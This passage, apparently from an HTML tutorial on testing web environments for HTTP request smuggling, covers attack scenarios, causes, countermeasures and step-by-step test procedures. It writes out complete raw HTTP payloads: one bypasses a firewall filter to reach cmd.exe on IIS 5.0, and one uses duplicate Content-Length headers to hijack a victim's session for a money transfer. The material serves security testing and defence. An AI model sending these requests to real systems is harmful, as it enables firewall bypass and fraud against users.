protection, specifically application layer content-based filters such as filters that block any dangerous URIs (such as potential worm filenames like cmd.exe or directory traversal strings like \"../../\"). Watchfire reported a vulnerability that affected IIS 5.0 and could be used to exploit CheckPoint FW-1. It happened due to IIS 5.0 truncating POST requests of certain page extensions in which the body exceeds 48K if the <i>Content-Type</i> header is not set to the expected value (such as <i>application/x-www-form-urlencoded</i> for .asp pages):</p>\n  <p>\n    <font face=\"'Courier New'\">1 POST /any.asp HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Length: 49223<br />5 <i>[CRLF]</i><br />6 AAAA... <i>[\"A\" x 49152 (48K)]</i><br />7 POST /any.asp HTTP/1.0<br />8 Connection: Keep-Alive<br />9 Content-Length: 30<br />10 <i>[CRLF]</i><br />11 POST /any.asp HTTP/1.0<br />12 Bla: <i>[space after the \"Bla:\", but no CRLF]</i><br />13 POST /any.asp?cmd.exe HTTP/1.0<br />14 Connection: Keep-Alive<br />15 <i>[CRLF]</i></font>\n  </p>\n  <p>CheckPoint properly parses the first POST from line 1 to 10 as dictated by the <i>Content-Length</i> header. It doesn’t stop parsing the first request after the sequence of “<i>A</i>”s because it doesn’t suffer from the truncation issue. However, IIS 5.0 truncated the first request in line 6, parsed a second one of <i>Content-Length</i> 30 from line 7 to 12, and finally parses a third and malicious one from lines 13 to 15:</p>\n  <p>\n    <font face=\"'Courier New'\">1 POST /any.asp HTTP/1.1<br />2 Host: vulnerable_site<br />3 Connection: Keep-Alive<br />4 Content-Length: 49223<br />5 <i>[CRLF]</i><br />6 AAAA... <i>[\"A\" x 49152 (48K)]</i><br />7 POST /any.asp HTTP/1.0<br />8 Connection: Keep-Alive<br />9 Content-Length: 30<br />10 <i>[CRLF]</i><br />11 POST /any.asp HTTP/1.0<br />12 Bla: <i>[space after the \"Bla:\", but no CRLF]</i><br />13 POST /any.asp?cmd.exe HTTP/1.0<br />14 Connection: Keep-Alive<br />15 <i>[CRLF]</i></font>\n  </p>\n  <p>IIS interprets and processes three requests while CheckPoint interprets only two (and doesn’t see the last one). This discrepancy on parsing the above data leads to attackers being able to bypass the firewall filter via HRS.</p>\n  <h2>\n    <span>\n      Cross-site request forgery\n    </span>\n  </h2>\n  <p>HTTP request smuggling also enables Cross-site Request Forgery (CSRF) attacks. Using this vulnerability, an attacker is able to forge a fake request and execute a malicious action such as transferring money from a victim’s bank account or changing the victim’s password without the victim noticing. Actually, using request smuggling, the attacker executes CSRF attacks without having to interact with the victim. Since it uses the victim’s current credentials, the attack is also known as Request Credential Hijacking. </p>\n  <p>The attack consists of sending a crafted attack request to a web server through a proxy:</p>\n  <p>\n    <font face=\"'Courier New'\">POST /some_script.jsp HTTP/1.0<br />Connection: Keep-Alive<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 9<br />Content-Length: 140<br />this=thatGET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 0<br />Foobar:</font>\n  </p>\n  <p>The goal is to use two different <i>Content-Length</i> headers so that the proxy processes the above request differently than the web server. The proxy parses the data as single POST request and forwards it to the web server. The web server parses it as a POST request with body’s length 9 and an incomplete GET request. Then, if a client sends a request, the web server processes the incomplete GET request (smuggled) concatenated with the client request. </p>\n  <p>If the client then sends:</p>\n  <p>\n    <font face=\"'Courier New'\">GET /any.asp HTTP/1.0<br />Cookie: session_id =1234567890<br />Authorization: Basic dsfkoiqrgnksdf</font>\n  </p>\n  <p>The web server processes the following request:</p>\n  <p>\n    <font face=\"'Courier New'\">GET /transfer.asp?to=attackers_account&ammount=10000 HTTP/1.0<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 0<br />Foobar: GET /any.asp HTTP/1.0<br />Cookie: session_id =1234567890<br />Authorization: Basic dsfkoiqrgnksdf</font>\n  </p>\n  <p>As a result, the vulnerable web server calls <i>transfer.asp</i> using the client’s credentials (victim). In the example above, the attacker attempts to transfer $10,000 to his account.&nbsp;&nbsp;</p>\n  <h1>\n    <span>Step 2: Analyze Causes and Countermeasures</span>\n  </h1>\n  <p>The next step in testing for HTTP request smuggling vulnerabilities is to analyze what causes them and how to defend against them. </p>\n  <h2>\n    <span>\n      HTTP Request Smuggling Causes\n    </span>\n  </h2>\n  <p>HTTP request smuggling happens because two HTTP entity/devices parse HTTP requests differently. The scenarios above involve using two <i>Content-Length</i> headers or a long request. In addition, attackers can use other combinations of conflicting headers such as <i>Transfer-Encoding:</i>&nbsp;chunked with a <i>Content-Length</i> header. If an HTTP device such as a firewall fails to parse an HTTP request as the final device, an attacker can smuggle an additional request through it and execute this attack.</p>\n  <h2>\n    <span>\n      HTTP Request Smuggling Countermeasures\n    </span>\n  </h2>\n  <p>To protect against HTTP request smuggling, you must fully patch all network devices such as web services, firewalls, and proxies. Whenever a vendor discovers an HTTP request smuggling bug, it releases a patch that can be easily downloaded and installed. In addition, there might be options for strict parsing (Watchfire mentioned a vulnerability that only affects Apache under certain configurations). Thus, it is important to always run with the stricter configuration so that any enclosed or smuggled requests are detected.&nbsp;</p>\n  <h1>\n    <span>Step 3: Start Testing and Exploring</span>\n  </h1>\n  <p>Now that you are familiar with HTTP request smuggling attack scenarios and understand their causes and countermeasures, this step will focus on detailing specific test cases for each of the different request smuggling scenarios.</p>\n  <p>\n    <span>\n    </span>\n  </p>\n  <h2>\n    <span>\n      Testing for Web Cache Poisoning through HTTP Request Smuggling\n    </span>\n  </h2>\n  <p>This test requires four hosts: an attacker, a client, a web server, and a web cache server. Follow these steps:</p>\n  <ol>\n    <li>Set up a network sniffer in the web cache server and start monitoring network traffic.</li>\n    <li>From the attacker computer, send a request to the web server through the cache server. Send a POST with two <i>Content-Length</i> headers along with a target page and a poison page as seen in the first scenario.</li>\n    <li>Wait until the web server replies to the original request.</li>\n    <li>From the client computer, open a web browser and navigate to the target page.</li>\n    <li>Stop monitoring network traffic in the web cache server.</li>\n  </ol>\n  <p>Expected results: The client should receive the original target page and not the poison page in step 4. In addition, the network capture must not show the web server replying with the contents of the poisoned page.</p>\n  <h2>\n    <span>\n      Testing for Firewall Bypass through HTTP Request Smuggling\n    </span>\n  </h2>\n  <p>This test requires three hosts: an attacker, a web server, and a firewall server. Follow these steps:</p>\n  <ol>\n    <li>Set up a network sniffer in the firewall server and start monitoring network traffic.</li>\n    <li>In the firewall server, make sure that rules to filter out dangerous URIs are enabled. </li>\n    <li>In the client computer, try to invoke a dangerous URI directly by using a GET request (without executing an attack). The firewall should block this.</li>\n    <li>From the attacker computer, send a request to the web server through the firewall server. Send a POST that has an embedded GET to the dangerous URI using different<i> Content-Length</i> headers or long bodies, as seen in the second scenario.</li>\n    <li>Wait until the web server processes the request.</li>\n    <li>Stop monitoring network traffic in the firewall server.</li>\n  </ol>\n  <p>Expected results: The capture shows that the web server doesn’t parse the embedded GET with the malicious URI. Another possible valid outcome is that the firewall parses the embedded GET and denies the malicious URI.<span>&nbsp;</span></p>\n  <h2>\n    <span>\n      Testing for Cross-Site Request Forgery through HTTP Request Smuggling\n    </span>\n  </h2>\n  <p>This test requires four hosts: an attacker, a client, a web server, and a proxy server. Follow these steps:</p>\n  <ol>\n    <li>Set up a network sniffer in the proxy server and start monitoring network traffic.</li>\n    <li>In the client, log in to the web application under test to get a valid cookie and/or authentication credentials.</li>\n    <li>From the attacker computer, send a crafted request to the web server through the proxy with two <i>Content-Length</i> and an embedded request to a page that executes the desired action (such as a page that makes bank account transfers, as seen in the third scenario).</li>\n    <li>Wait until the proxy forwards the request to the web server and the web server replies. The web server should only reply to the original request and not to the smuggled one.</li>\n    <li>In the client computer, make any request to the web server. This should trigger the second (smuggled) request to be parsed by the web server.</li>\n  </ol>\n  <p>Expected results: The capture shows that the web server replies correctly to the client request in step 5 instead of executing the malicious action.&nbsp;</p>\n  <h1>\n    <span>Step 4: Fine-tune Test Case Data</span>\n  </h1>\n  <p>The last step in testing for HTTP request smuggling vulnerabilities is to fine-tune test case data according to the different attack methods.</p>\n  <h2>\n    <span>\n      Fine-tune test case data depending on HRS technique\n    </span>\n  </h2>\n  <p>It is crucial that you understand the different HRS techniques so that you can tune your data accordingly. Below is a list of the different techniques presented by <i>Watchfire</i>:</p>\n  <ul>\n    <li>Double <i>Content-Length</i> header.</li>\n    <li>Combining <i>Transfer-Encoding: chunked</i>&nbsp;header and a <i>Content-Length </i>header.</li>\n    <li>Double CR.</li>\n    <li>GET Request with <i>Content-Length</i> (backward smuggling).</li>\n    <li>CRLF SP CRFL trick.</li>\n    <li>Sending a request with body &gt; 48 K. </li>\n  </ul>\n  <p>Note that the effectiveness of each of these attacks varies depending on the platform under test. For instance, Apache will behave different than IIS; therefore test case data should be tailored to each platform’s peculiarities.&nbsp;</p>\n  <h1>\n    <span>Conclusions</span>\n  </h1>\n  <p>HTTP request smuggling vulnerabilities apply to web environments with two or more web entities such as a web server with a proxy or a web server with a firewall.<span>&nbsp;</span>If your application lives in this environment, it is necessary to execute the test cases shown here in order to verify that all entities in the network equally parse HTTP requests. Any incongruities in parsing may lead to a request smuggling attack.To properly test for this bug, make sure to understand the attack scenarios, causes and countermeasures, as well as to apply the different testing procedures.</p>"
}